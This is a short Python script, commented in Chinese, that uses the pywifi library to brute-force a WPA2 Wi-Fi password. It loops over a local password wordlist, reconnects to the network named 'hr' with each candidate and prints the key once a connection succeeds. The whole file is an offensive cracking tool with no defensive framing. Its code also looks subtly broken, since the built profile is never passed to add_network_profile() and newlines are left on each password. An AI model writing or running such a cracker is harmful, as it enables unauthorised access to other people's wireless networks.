import pywifi
from pywifi import const
import time

#1.导入模块
#2.抓取网卡接口
#3.断开所有wifi
#4.读取密码本
#5.测试连接
#6.设置睡眠时间


#测试连接 返回连接结果
def wificonnect(pwd):
    #抓取网卡接口
    wifi = pywifi.PyWiFi()
    #获取第一个无线网卡
    ifaces = wifi.interfaces()[0]
    #断开所有的连接
    ifaces.disconnect()
    time.sleep(1)   #休息1秒钟
    wifistatus = ifaces.status()
    if wifistatus == const.IFACE_DISCONNECTED:  #如果真正断开连接，创建新的连接文件，进行连接
        print("未连接")
        #创建wifi连接文件,用于新wifi的连接
        profile = pywifi.Profile()
        print(profile)
        #要连接wifi的名称
        profile.ssid = "hr"
        #网卡的开发状态
        profile.auth = const.AUTH_ALG_OPEN
        #wifi加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        #加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        #密码
        profile.key = pwd
        #删除所有的wifi文件
        ifaces.remove_all_network_profiles()
        #设定新的连接文件
        tep_profile = ifaces.add_network_profile()
        #用新的连接文件测试连接
        ifaces.connect(tep_profile)   #连接新的文件
        #wifi连接的时间
        time.sleep(4)
        if ifaces.status() == const.IFACE_CONNECTED:   #如果连接成功，返回true,否则返回false
            return True
        else:
            return False

    else:
        print("已连接")

# wificonnect()




def  readPassword():
    print("开始破解：")
    path = r"D:\Users\Administrator\PycharmProjects\merchant\wifi破解\密码本.txt"  #密码本路径
    #打开文件
    file = open(path,"r",encoding='utf-8')  #以只读方式打开
    while True:   #写一个死循环，直到读到正确的密码开始，才逃出
        try:
            #readline()读取一行
            passsStr = file.readline()
            bool = wificonnect(passsStr)   #调用连接
            if bool:
                print("密码正确",passsStr)
                break   #跳出当前循环
            else:
                print("密码不正确",passsStr)
        except:
            #跳出当前循环，直接进行下一次循环
            continue   #continue,跳出本次循环，直接执行下次循环

readPassword()


